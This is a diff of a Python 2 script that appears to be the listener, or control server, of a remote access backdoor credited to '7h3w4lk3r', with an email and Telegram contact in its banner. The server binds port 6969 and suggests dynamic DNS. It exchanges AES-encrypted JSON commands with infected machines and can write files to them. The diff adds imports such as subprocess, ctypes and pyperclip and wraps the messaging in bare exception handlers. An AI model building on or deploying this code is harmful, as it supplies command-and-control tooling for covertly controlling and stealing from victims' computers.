@@ -1,17 +1,25 @@
 #!/usr/bin/python
 # -*- encoding: utf-8 -*-
 
+from Crypto import Random
+from Crypto.Cipher import AES
+import ctypes
+import os
+import platform
+import pyperclip
+import shutil
+import subprocess
 import json
 import sys
 import base64
 import hashlib
 import socket
-from Crypto import Random
-from Crypto.Cipher import AES
 
 ip='0.0.0.0' # can use noip dns
 print (ip)
 port = 6969
+
+
 
 global password
 
@@ -39,6 +47,7 @@ banner = green + """
 Created by: 7h3w4lk3r
 
 Email: bl4ckr4z3r@gmail.com
+Telegram ID: @w4lk3r1998
 """ + r
 
 
@@ -114,16 +123,23 @@ class listener:
         return decrypted
 
     def json_send(self, data):
-        json_data = json.dumps(data)
-        return self.conn.send(self.encrypt(json_data))
-
+        try:
+            json_data = json.dumps(data)
+            return self.conn.send(self.encrypt(json_data))
+        except:
+            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
+            pass
 
     def receive(self):
         json_data = ""
         while True:
-            json_data = json_data + self.decrypt(self.conn.recv(4096))
-            return json.loads(json_data)
-
+            try:
+                json_data = json_data + self.conn.recv(4096)
+                return json.loads(self.decrypt(json_data))
+            except ValueError:
+                continue
+            except:
+                pass
     def write_file(self,path,content):
         try:
             with open(path, "wb") as file:
@@ -222,3 +238,4 @@ if __name__ == '__main__':
         sys.exit(0)
     except Exception,e:
         print e
+
